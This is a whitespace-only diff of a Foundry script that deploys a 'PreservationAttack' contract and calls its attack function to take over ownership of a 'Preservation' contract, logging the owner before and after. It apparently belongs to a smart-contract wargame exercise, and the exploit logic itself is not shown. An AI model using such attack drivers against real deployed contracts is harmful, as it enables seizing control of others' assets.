@@ -10,13 +10,13 @@ contract PreservationScript is Script {
     PreservationAttack attacker;
 
     function run() external {
-	vm.startBroadcast();
-	attacker = new PreservationAttack();
-	console.log("PreservationAttack Contract deployed to:", address(attacker));
-	console.log("Preservation Contract initial owner:", preservation.owner());
-	console.log("Attacking...");
-	attacker.attack(address(preservation));
-	console.log("Preservation Contract new owner:", preservation.owner());
-	vm.stopBroadcast();
+        vm.startBroadcast();
+        attacker = new PreservationAttack();
+        console.log("PreservationAttack Contract deployed to:", address(attacker));
+        console.log("Preservation Contract initial owner:", preservation.owner());
+        console.log("Attacking...");
+        attacker.attack(address(preservation));
+        console.log("Preservation Contract new owner:", preservation.owner());
+        vm.stopBroadcast();
     }
 }
